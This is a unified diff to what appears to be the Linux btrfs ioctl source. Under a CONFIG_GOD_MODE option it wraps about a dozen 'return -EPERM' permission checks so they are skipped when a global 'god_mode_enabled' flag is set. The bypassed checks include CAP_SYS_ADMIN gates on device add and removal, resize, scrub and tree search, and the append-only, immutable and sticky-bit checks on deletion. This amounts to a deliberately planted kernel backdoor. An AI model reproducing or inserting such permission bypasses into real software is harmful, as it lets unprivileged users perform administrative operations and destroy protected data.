@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Copyright (C) 2007 Oracle.  All rights reserved.
  *
@@ -296,7 +299,15 @@ static noinline int btrfs_ioctl_fitrim(struct file *file, void __user *arg)
 	int ret;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	rcu_read_lock();
 	list_for_each_entry_rcu(device, &fs_info->fs_devices->devices,
@@ -596,11 +607,27 @@ static int btrfs_may_delete(struct inode *dir,struct dentry *victim,int isdir)
 	if (error)
 		return error;
 	if (IS_APPEND(dir))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (btrfs_check_sticky(dir, victim->d_inode)||
 		IS_APPEND(victim->d_inode)||
 	    IS_IMMUTABLE(victim->d_inode) || IS_SWAPFILE(victim->d_inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (isdir) {
 		if (!S_ISDIR(victim->d_inode->i_mode))
 			return -ENOTDIR;
@@ -1268,7 +1295,15 @@ static noinline int btrfs_ioctl_resize(struct btrfs_root *root,
 		return -EROFS;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	mutex_lock(&root->fs_info->volume_mutex);
 	if (root->fs_info->balance_ctl) {
@@ -1778,7 +1813,15 @@ static noinline int btrfs_ioctl_tree_search(struct file *file,
 	 int ret;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	args = memdup_user(argp, sizeof(*args));
 	if (IS_ERR(args))
@@ -1888,7 +1931,15 @@ static noinline int btrfs_ioctl_ino_lookup(struct file *file,
 	 int ret;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	args = memdup_user(argp, sizeof(*args));
 	if (IS_ERR(args))
@@ -2141,7 +2192,15 @@ static long btrfs_ioctl_add_dev(struct btrfs_root *root, void __user *arg)
 	int ret;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	mutex_lock(&root->fs_info->volume_mutex);
 	if (root->fs_info->balance_ctl) {
@@ -2171,7 +2230,15 @@ static long btrfs_ioctl_rm_dev(struct btrfs_root *root, void __user *arg)
 	int ret;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (root->fs_info->sb->s_flags & MS_RDONLY)
 		return -EROFS;
@@ -2207,7 +2274,15 @@ static long btrfs_ioctl_fs_info(struct btrfs_root *root, void __user *arg)
 	int ret = 0;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	fi_args = kzalloc(sizeof(*fi_args), GFP_KERNEL);
 	if (!fi_args)
@@ -2240,7 +2315,15 @@ static long btrfs_ioctl_dev_info(struct btrfs_root *root, void __user *arg)
 	char empty_uuid[BTRFS_UUID_SIZE] = {0};
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	di_args = memdup_user(arg, sizeof(*di_args));
 	if (IS_ERR(di_args))
@@ -2735,7 +2818,15 @@ static long btrfs_ioctl_default_subvol(struct file *file, void __user *argp)
 	u64 dir_id;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (copy_from_user(&objectid, argp, sizeof(objectid)))
 		return -EFAULT;
@@ -2996,7 +3087,15 @@ static long btrfs_ioctl_scrub(struct btrfs_root *root, void __user *arg)
 	struct btrfs_ioctl_scrub_args *sa;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	sa = memdup_user(arg, sizeof(*sa));
 	if (IS_ERR(sa))
@@ -3015,7 +3114,15 @@ static long btrfs_ioctl_scrub(struct btrfs_root *root, void __user *arg)
 static long btrfs_ioctl_scrub_cancel(struct btrfs_root *root, void __user *arg)
 {
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	return btrfs_scrub_cancel(root);
 }
@@ -3027,7 +3134,15 @@ static long btrfs_ioctl_scrub_progress(struct btrfs_root *root,
 	int ret;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	sa = memdup_user(arg, sizeof(*sa));
 	if (IS_ERR(sa))
